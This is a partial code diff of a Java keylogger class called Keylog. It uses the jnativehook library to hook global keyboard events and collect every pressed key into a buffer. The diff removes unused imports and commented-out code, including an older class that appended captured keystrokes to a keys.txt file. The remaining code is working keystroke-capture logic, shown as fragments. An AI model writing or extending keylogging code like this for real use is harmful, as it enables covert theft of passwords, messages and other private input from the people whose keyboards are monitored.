@@ -1,13 +1,5 @@
 package org.example;
 
-import java.io.IOException;
-import java.io.OutputStream;
-import java.io.PrintWriter;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.nio.file.StandardOpenOption;
-import java.security.Key;
 import java.util.logging.Level;
 
 import org.jnativehook.GlobalScreen;
@@ -37,13 +29,7 @@ public class Keylog implements NativeKeyListener {
 
     public void nativeKeyPressed(NativeKeyEvent e) {
         String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
-
-//        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
-//                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
-
         if (keyText.length() > 1) {
-//                writer.print("[" + keyText + "]");
-//            System.out.println(keyText);
             if (keyText.equals("Enter"))
             {
                 keylogStringBuffer.append('[');
@@ -75,8 +61,6 @@ public class Keylog implements NativeKeyListener {
                 keylogStringBuffer.append(keyText.toLowerCase());
             }
         }
-
-
     }
 
     public void nativeKeyReleased(NativeKeyEvent e) {
@@ -96,7 +80,6 @@ public class Keylog implements NativeKeyListener {
             System.exit(-1);
         }
         GlobalScreen.addNativeKeyListener(new Keylog());
-//        System.out.println("test");
     }
 
     public static void unRun() {
@@ -112,48 +95,3 @@ public class Keylog implements NativeKeyListener {
         // Nothing here
     }
 }
-
-
-//class KeyLoggerStart implements NativeKeyListener {
-//
-//    private static final Path file = Paths.get("keys.txt");
-//    public static final Logger logger = LoggerFactory.getLogger(KeyLoggerStart.class);
-//
-//    public static void init() {
-//
-//        // Get the logger for "org.jnativehook" and set the level to warning.
-//        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
-//        logger.setLevel(Level.WARNING);
-//
-//        // Don't forget to disable the parent handlers.
-//        logger.setUseParentHandlers(false);
-//    }
-//
-//    public void nativeKeyPressed(NativeKeyEvent e) {
-//        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
-//
-//        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
-//                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
-//
-//            if (keyText.length() > 1) {
-//                writer.print("[" + keyText + "]");
-//                System.out.println(keyText);
-//            } else {
-//                writer.print(keyText);
-//                System.out.println(keyText);
-//            }
-//
-//        } catch (IOException ex) {
-//            logger.error(ex.getMessage(), ex);
-//            System.exit(-1);
-//        }
-//    }
-//
-//    public void nativeKeyReleased(NativeKeyEvent e) {
-//        // Nothing
-//    }
-//
-//    public void nativeKeyTyped(NativeKeyEvent e) {
-//        // Nothing here
-//    }
-//}
